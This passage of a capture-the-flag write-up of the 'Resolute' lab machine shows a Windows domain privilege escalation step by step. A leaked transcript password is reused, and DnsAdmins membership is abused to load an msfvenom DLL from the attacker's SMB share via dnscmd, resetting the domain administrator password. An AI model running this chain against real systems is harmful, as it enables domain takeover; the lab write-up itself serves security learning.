
Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Contractors
The command completed successfully.
```
Till now, nothing new is shown and now I have to continue with enumerating on the system for useful information.
I start enumerating in the root on the c:\ drive to see if there are unusual directories.
```
*Evil-WinRM* PS C:\Users\melanie\Documents> cd c:\
*Evil-WinRM* PS C:\> ls -force


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-        12/3/2019   6:40 AM                $RECYCLE.BIN
d--hsl        9/25/2019  10:17 AM                Documents and Settings
d-----        9/25/2019   6:19 AM                PerfLogs
d-r---        9/25/2019  12:39 PM                Program Files
d-----       11/20/2016   6:36 PM                Program Files (x86)
d--h--        9/25/2019  10:48 AM                ProgramData
d--h--        12/3/2019   6:32 AM                PSTranscripts
d--hs-        9/25/2019  10:17 AM                Recovery
d--hs-        9/25/2019   6:25 AM                System Volume Information
d-r---        12/4/2019   2:46 AM                Users
d-----        12/4/2019   5:15 AM                Windows
-arhs-       11/20/2016   5:59 PM         389408 bootmgr
-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT
-a-hs-       10/11/2022   2:16 AM      402653184 pagefile.sys
```
The directory "PSTranscripts" is not known to me and therfore is is interesting to see what is inside.
```

*Evil-WinRM* PS C:\> ls PSTranscripts -force


    Directory: C:\PSTranscripts


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--h--        12/3/2019   6:45 AM                20191203


*Evil-WinRM* PS C:\> cd PSTranscripts
*Evil-WinRM* PS C:\PSTranscripts> ls -force


    Directory: C:\PSTranscripts


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--h--        12/3/2019   6:45 AM                20191203


*Evil-WinRM* PS C:\PSTranscripts> cd 20191203
*Evil-WinRM* PS C:\PSTranscripts\20191203> ls -force


    Directory: C:\PSTranscripts\20191203


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt

```
Inside the subdirectories a txt file is stored. Perhahps something interesting is stored within it that I can use.
```
*Evil-WinRM* PS C:\PSTranscripts\20191203> type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
**********************
Windows PowerShell transcript start
Start time: 20191203063201
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
Command start time: 20191203063455
**********************
PS>TerminatingError(): "System error."
>> CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
>> CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="Stream"; value="True"
**********************
Command start time: 20191203063455
**********************
PS>ParameterBinding(Out-String): name="InputObject"; value="PS megabank\ryan@RESOLUTE Documents> "
PS megabank\ryan@RESOLUTE Documents>
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
>> CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="Stream"; value="True"
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="InputObject"; value="The syntax of this command is:"
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ `````````````````````````````````````````````````````````
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ `````````````````````````````````````````````````````````
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
*Evil-WinRM* PS C:\PSTranscripts\20191203> 

```
In the script a plain text password of the user ryan is shown: **cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!** creating a X: share to the backup folder on the fs01 server.
Probably I can try using those credentials on the target to see if I can move to another account on the target.
```
┌──(emvee㉿kali)-[~/Documents/Resolute]
└─$ crackmapexec smb $ip -u ryan -p 'Serv3r4Admin4cc123!'
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\ryan:Serv3r4Admin4cc123! (Pwn3d!)
```
So the password and username combination does work, which means I can start a shell as ryan via **evil-winrm** on the target.
```
┌──(emvee㉿kali)-[~/Documents/Resolute]
└─$ evil-winrm -i $ip -u 'ryan' -p  'Serv3r4Admin4cc123!' 

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\ryan\Documents> whoami
megabank\ryan
*Evil-WinRM* PS C:\Users\ryan\Documents> 
```

The shell is available to me and I am "ryan" on the machine. I started lookin for a kind of flag on the desktop again, but I noticed not a flag file, but a note.txt file. This could be useful information. 
```
*Evil-WinRM* PS C:\Users\ryan\Documents> type ../Desktop/note.txt
Email to team:

- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute

```
It looks like there is some mechanism in place which reverts any change to the system within one minute. For the the moment I have no idea what I could change on the system to gain access as a privileged user. So let's find out what privileges I have as "ryan" by using **whoami /priv**.

```
*Evil-WinRM* PS C:\Users\ryan\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
The privilges are not different then the ones of melanie, so I have t continue gather information as this user. I know the user is a member of the **Contracters** group, but could it have more memberships? I decided to check it with the command **whoami /groups**.

```
*Evil-WinRM* PS C:\Users\ryan\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ===============================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```

The group **MEGABANK\DnsAdmins** was something that was feeling not okat. I noticed an Alias as type and one of the attrbutes was Local Group. Time to use some [Google Fu](https://www.google.com/search?q=dnsadmins+group+privilege+escalation) to find out what I could do with DnsAdmins. One of the articles if from [Hacking Articles](https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/) explaining how you could escalte privileges as dnsadmin.

According this article the dnsadmin can be used to load a dll with the dnscmd.exe file.
> The executable we will use to pass the DLL code into the memory as SYSTEM is called dnscmd.exe.

The attack is also explained on [lolbas-project](https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/), which I use as reference during my attack.


With msfvenom it's possible to build a dll file which could be load on the target via a file share (SMB service) on my machine. I know that with net user a password could be changed for an user. According some documentation of [Microsoft](https://social.technet.microsoft.com/Forums/windows/en-US/870a0add-2a68-4c42-b50f-3dd1934edca5/net-user-ltuseridgt-ltuserpasswordgt-domain-access-denied?forum=winserversecurity), it should work with **net user USERNAME NEW-PASSWORD /domain**. Within **msfvenom** it is possible to specify which command should be run. To build the dll which performs the password change for the administrator I use the following command: **msfvenom -p windows/x64/exec cmd='net user administrator Password123! /domain' -f dll > da.dll**

```
┌──(emvee㉿kali)-[~/transfer]
└─$ msfvenom -p windows/x64/exec cmd='net user administrator Password123! /domain' -f dll > da.dll
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::NAME
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: previous definition of NAME was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::PREFERENCE
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: previous definition of PREFERENCE was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::IDENTIFIER
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: previous definition of IDENTIFIER was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::NAME
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: previous definition of NAME was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::PREFERENCE
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: previous definition of PREFERENCE was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::IDENTIFIER
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: previous definition of IDENTIFIER was here
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 311 bytes
Final size of dll file: 8704 bytes
```
Since the file was build, it is time to host it on my share and deliver it on the target. To start the SMB service of Impacket is pretty easy, you just have to give a share name and tell which directory should be shared. The command looks like this: **sudo smbserver.py share ./**
```
┌──(emvee㉿kali)-[~/transfer]
└─$ sudo smbserver.py share ./                                                                                                                       
[sudo] password for emvee: 
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

To load the payload dll, you have to execute the following command **cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.14.59\share\da.dll** so the file is loaded from the network share which I host on my SMB service.


```
*Evil-WinRM* PS C:\Users\ryan\Documents> cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.14.59\share\da.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```
To trigger the payload from my dll file I have to stop the DNS service and start it again to load my dll file.

```
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2688
        FLAGS              :
```
Since the service has been started again with my dll (payload) file, it is time to rock and roll as administrator with my own password and capture the root flag!
```
┌──(emvee㉿kali)-[~]
└─$ evil-winrm -i $ip -u 'administrator' -p  'Password123!'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint


*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
Resolute
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami;hostname;type ../Desktop/root.txt
megabank\administrator
Resolute
< --- SNIP ROOT FLAG --- >
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```
